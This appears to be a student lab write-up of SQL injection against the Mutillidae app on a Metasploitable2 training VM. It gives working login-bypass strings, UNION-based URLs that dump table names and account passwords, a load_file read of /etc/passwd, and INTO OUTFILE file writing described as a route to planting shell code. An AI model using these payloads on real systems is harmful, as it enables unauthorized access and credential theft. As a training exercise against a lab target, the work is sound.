# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database.

Identify IP address using ifconfig in Metasploitable2

![1](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/5eb3f9c5-fd35-400e-9a69-273efd2d58d3)


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![2](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/aea9976c-d520-438b-98fd-34df1007c7a3)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![3](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/011fd26c-0532-4c8c-ba02-a8d357781fd4)

Click on the menu Login/Register and register for an account

![4](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/36b2f573-fc4f-41cc-9da4-30c39719c991)

Click on the link “Please register here”

![5](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/0245892e-52ca-483f-917c-c2b3721f7ccf)


![6](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/ff99cdf2-9c95-4509-80fb-52b203d6613c)

Click on “Create Account” to display the following page:

![7](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/db65050f-3420-48f1-a04d-3b6fb6c5797f)


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![8](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/fc09e41b-5f0c-4e74-9512-33dfecdbc0c3)

Click “Login”. The logged in page will show as below:

![9](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/00c2a8be-27b8-44ac-b675-658254c24538)

## Bypassing login field:
The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![10](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/c2f65f8f-4cd9-4726-8a44-1e92224a902d)

Click the login button and you will see it enter into the administrator page.

![11](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/7c137940-8522-42f7-9c36-c1f9e8e85055)

## Union-based SQL injection:
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:

![12](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/952d359c-bdd9-4eb9-9566-cff42632751f)


![13](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/9bc9900d-b6c2-40f8-853b-2c1dcd8f872d)


![14](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/60553341-91b1-47e9-9679-34cd42115f73)


![15](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/a078dd0e-e7bc-489e-9093-3f18068f3815)

![16](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/bb2bc44d-a491-4f55-bc73-745f3b00c98f)


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![17](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/9a9a952e-602f-4791-9b34-bf122496faf0)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![18](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/82f093e1-04de-4885-bf56-b3259dd97c9a)


After adding the order by 6 into the existing url , the following error statement will be obtained:

![19](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/e1f22cc3-2a1d-4127-8b13-76d241bf7127)


When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.


![20](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/294b640b-ebe3-4b51-8e77-a7091d45c2d6)

As it is having 5 columns the query worked fine and it provides the correct result

![21](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/d4b80114-5780-46d2-ac5b-d9e6a4359500)

As it is having 5 columns the query worked fine and it provides the correct result



![22](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/7a86dba4-5920-4344-b011-f65de9b6d3b8)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information

![23](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/b661a44f-0510-4688-85e9-bbe1868f4846)


Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details


![24](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/ae11fcfc-d422-40ba-bd20-c362350e5026)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![25](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/45c074f5-190a-4f19-b5ae-819a7d83993b)

The url once executed will retrieve table names from the “owasp 10” database.
## Extracting sensitive data such as passwords:
When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![26](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/1fb6be1b-8d1e-4d78-bdfc-bb44c9021548)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details


![27](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/2f6394f6-6af7-4125-b501-9b935d7bae2e)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details


![28](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/862d31ff-0324-4986-8481-51c0bf5d4d46)

## Reading and writing files on the webserver:
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![29](https://github.com/Nandhinijaya/sqlinjection/assets/121998147/5c46b2ba-2fe3-442a-b0f9-5d0d051ba5c4)


the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
